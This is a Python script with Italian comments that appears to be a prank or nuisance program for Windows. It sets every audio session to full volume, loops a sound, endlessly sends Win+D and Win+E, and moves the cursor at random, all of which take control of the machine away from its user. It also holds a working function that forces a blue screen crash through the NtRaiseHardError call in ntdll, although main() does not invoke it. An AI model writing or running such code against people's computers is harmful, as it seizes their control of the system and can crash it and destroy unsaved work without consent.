import tkinter as tk
import keyboard
import pyautogui
from pygame import mixer
from ctypes import cast, windll, c_int, c_uint, c_ulong, POINTER, byref
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
import random
import threading

# Funzione per causare un BSOD
def bsod():
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint()))

# Funzione per impostare il volume al 100%
def set_volume(volume_level):
    sessions = AudioUtilities.GetAllSessions()
    for session in sessions:
        volume = cast(session._ctl.QueryInterface(ISimpleAudioVolume), POINTER(ISimpleAudioVolume))
        volume.SetMasterVolume(volume_level, None)

# Funzione per riprodurre il suono in loop
def play_sound():
    mixer.init()
    mixer.music.load('sound.mp3')
    mixer.music.play(-1)

# Funzione per simulare la pressione dei tasti Win+D, Win+E
def simulate_key_press():
    while True:
        keyboard.send('win+d')
        keyboard.send('win+e')

# Funzione per spostare il cursore in posizioni casuali sullo schermo
def move_cursor():
    screen_width, screen_height = pyautogui.size()
    while True:
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y)

def main():
    # Imposta il volume al 100%
    set_volume(1.0)
    # Riproduce il suono in loop
    play_sound()
    # Simula la pressione dei tasti Win+D, Win+E
    threading.Thread(target=simulate_key_press, daemon=True).start()
    # Sposta il cursore in posizioni casuali sullo schermo
    threading.Thread(target=move_cursor, daemon=True).start()
    # Crea la finestra Tkinter (l'interfaccia utente non verrà visualizzata poiché il programma è occupato con altre attività)
    root = tk.Tk()
    root.mainloop()

if __name__ == "__main__":
    main()
